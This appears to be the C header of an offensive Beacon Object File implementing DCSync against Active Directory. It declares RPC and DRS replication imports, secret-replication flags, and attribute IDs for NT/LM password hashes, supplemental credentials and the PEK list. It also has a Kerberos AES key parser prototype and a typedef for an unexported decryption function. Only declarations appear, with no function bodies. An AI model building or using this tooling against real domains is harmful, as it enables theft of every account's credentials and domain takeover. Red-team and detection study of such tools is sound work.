#include <rpc.h>
#include <wincrypt.h>
#include <windows.h>

#include <ntdsapi.h>

DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *buffer, size_t count,
                                             const char *format, ...);
DECLSPEC_IMPORT void *__cdecl MSVCRT$memset(void *dest, int c, size_t count);
DECLSPEC_IMPORT void *__cdecl MSVCRT$memcpy(void *dest, const void *src,
                                            size_t count);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char *str);
DECLSPEC_IMPORT char *__cdecl MSVCRT$strcat(char *dest, const char *src);
DECLSPEC_IMPORT void *__cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void *ptr);

DECLSPEC_IMPORT void __cdecl KERNEL32$Sleep(unsigned int milliseconds);

// RPC Functions
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringBindingComposeA(
    unsigned char *ObjUuid, unsigned char *ProtSeq, unsigned char *NetworkAddr,
    unsigned char *Endpoint, unsigned char *Options,
    unsigned char **StringBinding);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFromStringBindingA(
    unsigned char *StringBinding, RPC_BINDING_HANDLE *Binding);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY
RPCRT4$RpcStringFreeA(unsigned char **String);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY
RPCRT4$RpcBindingFree(RPC_BINDING_HANDLE *Binding);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingSetAuthInfoA(
    RPC_BINDING_HANDLE Binding, unsigned char *ServerPrincName,
    unsigned long AuthnLevel, unsigned long AuthnSvc, void *AuthIdentity,
    unsigned long AuthzSvc);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingSetOption(
    RPC_BINDING_HANDLE hBinding, unsigned long option, ULONG_PTR optionValue);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$I_RpcBindingInqSecurityContext(
    RPC_BINDING_HANDLE Binding, void **SecurityContextHandle);

DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$UuidCreate(UUID *Uuid);

DECLSPEC_IMPORT CLIENT_CALL_RETURN RPC_VAR_ENTRY
RPCRT4$NdrClientCall2(void *pStubDescriptor, void *pFormat, ...);

typedef struct {
  DWORD cb;
  DWORD dwFlags;
  GUID SiteObjGuid;
  DWORD Pid;
  DWORD dwReplEpoch;
} DRS_EXTENSIONS_INT;

// typedef void *DRS_HANDLE;

void DCSync(LPCWSTR samAccountName);
void BytesToHex(const BYTE *bytes, DWORD len, char *output);
DWORD HexToBinary(const BYTE *hexData, DWORD hexLen, BYTE *binaryOut);
BOOL ParseKerberosKeys(const BYTE *propertyData, DWORD propertyLen,
                       const char *samAccountName, const char *dcHostname,
                       DWORD accountType, char *aes256Out, char *aes128Out);

// DRS Flags
#define DRS_INIT_SYNC 0x00000001
#define DRS_WRIT_REP 0x00000010
#define DRS_NEVER_SYNCED 0x00000020
#define DRS_FULL_SYNC_NOW 0x00000200
#define DRS_SYNC_URGENT 0x00008000
#define DRS_GET_ANC 0x00000008
#define DRS_GET_NC_SIZE 0x00001000
#define DRS_SPECIAL_SECRET_PROCESSING 0x00000004

// DRS Extended Operations
#define EXOP_REPL_OBJ 6
#define EXOP_REPL_SECRETS 3

// Attribute Types
#define ATT_UNICODE_PWD 0x9005A
#define ATT_NT_PWD_HISTORY 0x9005E
#define ATT_LM_PWD_HISTORY 0x900A0
#define ATT_SUPPLEMENTAL_CREDS 0x9007D
#define ATT_SAM_ACCOUNT_NAME 0x900DD
#define ATT_SAM_ACCOUNT_TYPE 0x9012E
#define ATT_USER_PRINCIPAL_NAME 0x90290
#define ATT_OBJECT_SID 0x90092
#define ATT_PEK_LIST 0x90481

// sAMAccountType values for account type detection
#define SAM_USER_OBJECT 0x30000000     // Normal user account
#define SAM_MACHINE_ACCOUNT 0x30000001 // Computer/workstation account
#define SAM_TRUST_ACCOUNT 0x30000002   // Trust account
//
//
// non exported functions for loading from memory
typedef NTSTATUS(WINAPI *SystemFunction025_t)(const BYTE *KeyMaterial,
                                              const ULONG *KeySeed,
                                              BYTE *Output);
